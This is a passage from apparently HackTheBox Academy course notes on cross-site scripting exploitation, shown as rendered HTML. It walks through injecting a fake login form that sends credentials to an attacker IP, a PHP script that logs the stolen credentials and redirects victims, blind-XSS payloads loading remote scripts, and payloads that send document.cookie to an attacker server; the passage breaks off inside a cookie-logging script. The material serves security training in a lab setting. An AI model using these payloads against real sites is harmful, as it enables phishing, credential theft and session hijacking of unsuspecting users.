+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">background</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;#141d2b&#34;</span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p><strong>Changing page title</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">title</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;HackTheBox Academy&#39;</span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p><strong>Changing page text</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementsByTagName</span>(<span style="color:#e6db74">&#39;body&#39;</span>)[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;New Text&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// jQuery: $(&#34;#todo&#34;).html(&#39;New Text&#39;);
+</span></span></span></code></pre></div><p>　</p>
+<h2 id="phishing">Phishing</h2>
+<p>Phishing attacks usually use legitimate-looking information to trick the victims into sending their sensitive information to the attacker. A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker&rsquo;s server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.</p>
+<p>Furthermore, suppose we were to identify an XSS vulnerability in a web application for a particular organization. In that case, we can use such an attack as a phishing simulation exercise, which will also help us evaluate the security awareness of the organization&rsquo;s employees, especially if they trust the vulnerable web application and do not expect it to harm them.</p>
+<h3 id="xss-discovery-1">XSS Discovery</h3>
+<p>We start by attempting to find the XSS vulnerability in the web application at <code>/phishing</code> from the server at the end of this section. When we visit the website, wee see that it is a simple online image viewer, where we can input a URL of an image, and it&rsquo;ll display it.</p>
+<p>This form of image viewers is common in online forums and similar web applications. As we have control over the URL, we can start by using the basic XSS payload we&rsquo;ve been using. But when we try that payload, we see that nothing gets executed, and we get the <code>dead image url</code> icon:</p>
+<p>So, we must run the XSS Discovery process we previously learned to find a working XSS payload. Before you continue try to find an XSS payload that successfully executes JavaScript code on the page.</p>
+<blockquote>
+<p>Tip: to understand which payload should work, try to view how your input is displayed in the HTML source after you add it.</p>
+</blockquote>
+<h3 id="login-form-injection">Login Form Injection</h3>
+<p>Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the target page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we&rsquo;d get their credentials.</p>
+<p>We can easily find an HTML code for a basic login form, or we can write our own login form. The following example should present a login form:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">h3</span>&gt;Please login to continue&lt;/<span style="color:#f92672">h3</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://OUR_IP</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Username&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span></code></pre></div><p>In the above HTML code, <code>OUR_IP</code> is the IP of our VM, which we can find the (<code>ip a</code>) command under <code>tun0</code>. We will later be listening on this IP to retrieve the credentials sent from the form. The login form should look as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h3</span>&gt;Please login to continue&lt;/<span style="color:#f92672">h3</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Username&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><p>Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function <code>document.write()</code>, and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside the <code>write</code> function, the final JavaScript code should be as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&#34;username&#34; name=&#34;username&#34; placeholder=&#34;Username&#34;&gt;&lt;input type=&#34;password&#34; name=&#34;password&#34; placeholder=&#34;Password&#34;&gt;&lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Login&#34;&gt;&lt;/form&gt;&#39;</span>);
+</span></span></code></pre></div><p>We can now inject this JavaScript code using our XSS payload (i.e., instead of running the <code>alert(window.origin)</code> JavaScript code). In this case, we are exploiting a reflected XSS vulnerability, so we can copy the URL and our XSS payload in its parameters, as we&rsquo;ve done in the reflected XSS section, and the page should look as follows when we visit the malicious URL.</p>
+<h3 id="cleaning-up">Cleaning Up</h3>
+<p>We can see that the URL field is still displayed, which defeats our line of &ldquo;<code>Please login to continue</code>&rdquo;. So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function <code>document.getElementById().remove()</code> function</p>
+<p>To find the <code>id</code> of the HTML element we want to remove, we can open the <code>Page Inspector Picker</code> by clicking <code>Ctrl+Shift+C</code> and then clicking on the element we need.</p>
+<p>As we see in both the source code and the hover text, the <code>url</code> form has the id <code>urlform</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">role</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GET&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;urlform&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Image URL&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;url&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span></code></pre></div><p>So, we can now use this id with the <code>remove()</code> function to remove the URL form:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;urlform&#39;</span>).<span style="color:#a6e22e">remove</span>();
+</span></span></code></pre></div><p>Now, once we add this code to our previous JavaScript code (after the <code>document.write</code> function), we can use this new JavaScript code in our payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&#34;username&#34; name=&#34;username&#34; placeholder=&#34;Username&#34;&gt;&lt;input type=&#34;password&#34; name=&#34;password&#34; placeholder=&#34;Password&#34;&gt;&lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Login&#34;&gt;&lt;/form&gt;&#39;</span>);document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;urlform&#39;</span>).<span style="color:#a6e22e">remove</span>();
+</span></span></code></pre></div><p>When we try to inject our updated JavaScript code, we see that the URL form is indeed no longer displayed. We also see that there&rsquo;s still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>...PAYLOAD... <span style="color:#75715e">&lt;!--
+</span></span></span></code></pre></div><p>This removes the remaining bit of original HTML code, and our payload should be ready. The page now looks like it legitimately requires a login. We can now copy the final URL that should include the entire payload, and we can send it to our victims and attempt to trick them into using the fake login form. You can try visiting the URL to ensure that it will display the login form as intended. Also try logging into the above login form and see what happens.</p>
+<h3 id="credential-stealing">Credential Stealing</h3>
+<p>Finally, we come to the part where we steal the login credentials when the victim attempts to log in on our injected login form. If you tried to log into the injected login form, you would probably get the error <code>This site can't be reached</code>. This is because, as mentioned earlier, our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get a <code>site can't be reached</code> error.</p>
+<p>So, let us start a simple <code>netcat</code> server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nc -lvnp <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">80</span> ...
+</span></span></code></pre></div><p>Now, let&rsquo;s attempt to login with the credentials <code>test:test</code>, and check the <code>netcat</code> output we get (<em>don&rsquo;t forget to replace OUR_IP in the XSS payload with your actual IP</em>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.XX.XX<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.XX.XX<span style="color:#f92672">]</span> XXXXX
+</span></span><span style="display:flex;"><span>GET /?username<span style="color:#f92672">=</span>test&amp;password<span style="color:#f92672">=</span>test&amp;submit<span style="color:#f92672">=</span>Login HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 10.10.XX.XX
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span></code></pre></div><p>As we can see, we can capture the credentials in the HTTP request URL (<code>/?username=test&amp;password=test</code>). If any victim attempts to log in with the form, we will get their credentials.</p>
+<p>However, as we are only listening with a <code>netcat</code> listener, it will not handle the HTTP request correctly, and the victim would get an <code>Unable to connect</code> error, which may raise some suspicious. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.</p>
+<p>The following PHP scripts should do what we need, and we will write it to a file on our VM that we&rsquo;ll call <code>index.php</code> and place it in <code>/tmp/tmpserver/</code> (<em>don&rsquo;t forget to replace <code>SERVER_IP</code> with the ip from our exercise</em>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;password&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;creds.txt&#34;</span>, <span style="color:#e6db74">&#34;a+&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fputs</span>($file, <span style="color:#e6db74">&#34;Username: </span><span style="color:#e6db74">{</span>$_GET[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> | Password: </span><span style="color:#e6db74">{</span>$_GET[<span style="color:#e6db74">&#39;password&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: http://SERVER_IP/phishing/index.php&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($file);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Now that we have our <code>index.php</code> file ready, we can start a PHP listening server, which we can use instead of the basic <code>netcat</code> listener we used earlier:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ mkdir /tmp/tmpserver
+</span></span><span style="display:flex;"><span>$ cd /tmp/tmpserver
+</span></span><span style="display:flex;"><span>$ vi index.php <span style="color:#75715e">#at this step we wrote our index.php file</span>
+</span></span><span style="display:flex;"><span>$ sudo php -S 0.0.0.0:80
+</span></span><span style="display:flex;"><span>PHP 7.4.15 Development Server <span style="color:#f92672">(</span>http://0.0.0.0:80<span style="color:#f92672">)</span> started
+</span></span></code></pre></div><p>Let&rsquo;s try logging into the injected login form and see what we get. We see that we get redirected to the original Image Viewer page. If we check the <code>creds.txt</code> file in our Pwnbox, we see that we did get the login credentials</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat creds.txt
+</span></span><span style="display:flex;"><span>Username: test | Password: test
+</span></span></code></pre></div><p>With everything ready, we can start our PHP server and send the URL that includes our XSS payload to our victim, and once they log into the form, we will get their credentials and use them to access their accounts.</p>
+<p>　</p>
+<h2 id="session-hijacking">Session Hijacking</h2>
+<p>Modern web applications use cookies to maintain a user&rsquo;s session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim&rsquo;s browser, they may be able to gain logged-in access with the victim&rsquo;s user without knowing their credentials.</p>
+<p>With the ability to execute JavaScript code on the victim&rsquo;s browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a <strong>Session Hijacking</strong> (aka Cookie Stealing) attack.</p>
+<h3 id="blind-xss-detection">Blind XSS Detection</h3>
+<p>We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. However, in this exercise, we will be dealing with a <strong>Blind XSS</strong> vulnerability. A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don&rsquo;t have access to.</p>
+<p>Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:</p>
+<ul>
+<li>Contact forms</li>
+<li>Reviews</li>
+<li>User details</li>
+<li>Support tickets</li>
+<li>HTTP User-Agent header</li>
+</ul>
+<p>Let&rsquo;s run the test on the web application on (<code>/hijacking</code>) in the server at the end of this section. We see a User Registration page with multiple fields, so let&rsquo;s try to submit a <code>test</code> user to see how the form handles the data. Once we submit the form we get the following message: <code>thank you for registering</code></p>
+<p>This indicates that we will not see how our input will be handled or how it will look in the browser since it will appear for the Admin only in a certain Admin Panel that we do not have access to. In non-blind cases, we can test each field until we get an <code>alert</code> box, like what we&rsquo;ve been doing throughout the module. However, as we do not have access over the Admin panel in this case, <em>how would we be able to detect an XSS vulnerabliity if we cannot see how the output is handled?</em></p>
+<p>To do so, we can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.</p>
+<p>However, this introduces two issues:</p>
+<ol>
+<li>
+<p><em>How can we know which specific field is vulnerable?</em> - since any of the fields may execute our code, we can&rsquo;t know which of them did</p>
+</li>
+<li>
+<p><em>How can we know what XSS payload to use?</em> - since the page may be vulnerable, but the payload may not work?</p>
+</li>
+</ol>
+<h3 id="loading-a-remote-script">Loading a Remote Script</h3>
+<p>In HTML, we can write JavaScript code within the <code>&lt;script&gt;</code> tags, but we can also include a remote script by providing its URL, as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://OUR_IP/script.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>So, we can use this to execute a remove JavaScript file that is served on our VM. We can change the requested script name from <code>script.js</code> to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://OUR_IP/username&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>If we get a request for <code>/username</code>, then we know that the <code>username</code> field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request.</p>
+<p>The following are a few examples we can use from <code>PayloadAllTheThings</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://OUR_IP</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&#39;&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://OUR_IP</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://OUR_IP</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>javascript:eval(&#39;var a=document.createElement(\&#39;script\&#39;);a.src=\&#39;http://OUR_IP\&#39;;document.body.appendChild(a)&#39;)
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">b</span>(){eval(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>)};<span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#a6e22e">b</span>);<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;//OUR_IP&#34;</span>);<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">send</span>();&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">getScript</span>(<span style="color:#e6db74">&#34;http://OUR_IP&#34;</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>As we can see, various payloads start with an injection <code>'&gt;</code>, which may or may not work depending on how our input is handled in the backedn. As previously mentioned in the XSS Discovery section, if we had access to the source code (i.e., in a DOM XSS), it would be possible to precisely write the required payload for a successful injection. This is why Blind XSS has a higher success rate with DOM XSS type of vulnerabilities.</p>
+<p>Before we start sending payloads, we need to start a listener on our VM, using <code>netcat</code> or <code>php</code> as shown in a previous section:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ mkdir /tmp/tmpserver
+</span></span><span style="display:flex;"><span>$ cd /tmp/tmpserver
+</span></span><span style="display:flex;"><span>$ sudo php -S 0.0.0.0:80
+</span></span><span style="display:flex;"><span>PHP 7.4.15 Development Server <span style="color:#f92672">(</span>http://0.0.0.0:80<span style="color:#f92672">)</span> started
+</span></span></code></pre></div><p>Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP, as mentioned earlier, like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://OUR_IP/fullname</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt; #this goes inside the full-name field
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://OUR_IP/username</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt; #this goes inside the username field
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span></code></pre></div><blockquote>
+<p><strong>Tip</strong>: we will notice that the email must match an email format, even if we try manipulating the HTTP request paramters, as it seems to be validated on both the frontend and the backend. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.</p>
+</blockquote>
+<p>Once we submit the form, we wait a few seconds and check our terminal to see if anything called our server. If nothing calls our server, then we can proceed to the next payload, and so on. Once we receive a call to our server, we should note the last XSS payload we used as a working payload and note the input field name that called our server as the vulnerable input field.</p>
+<p><em><strong>Try testing various remote script XSS payloads with the remaining input fields, and see which of them sends an HTTP request to find a working payload.</strong></em></p>
+<h3 id="session-hijacking-1">Session Hijacking</h3>
+<p>Once we find a working XSS payoad and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.</p>
+<p>A <strong>session hijacking</strong> attack is very similar to the phishing attack we performed in the previous section. It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.</p>
+<p>There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by <code>PayloadAllTheThings</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://OUR_IP/index.php?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://OUR_IP/index.php?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;
+</span></span></code></pre></div><p>Using any of the two payloads should work in sending us a cookie, but we&rsquo;ll use the second one, as it simply adds an image to the page, which may not be very malicious looking, while the first navigates to our cookie grabber PHP page, which may look suspicious.</p>
+<p>We can write any of these JavaScript payloads to <code>script.js</code>, which will be hosted on our VM as well:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://OUR_IP/index.php?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>
+</span></span></code></pre></div><p>Now, we can change the URL in the XSS payload we found earlier to use <code>script.js</code> (<em>don&rsquo;t forget to replace <code>OUR_IP</code> with your VM IP in the JS script and the XSS payload</em>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://OUR_IP/script.js</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we&rsquo;ll get all of their cookies ordered in a file.</p>
+<p>We can save the following PHP script as <code>index.php</code> and re-run the PHP server again:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $list <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;;&#34;</span>, $_GET[<span style="color:#e6db74">&#39;c&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($list <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $value) {
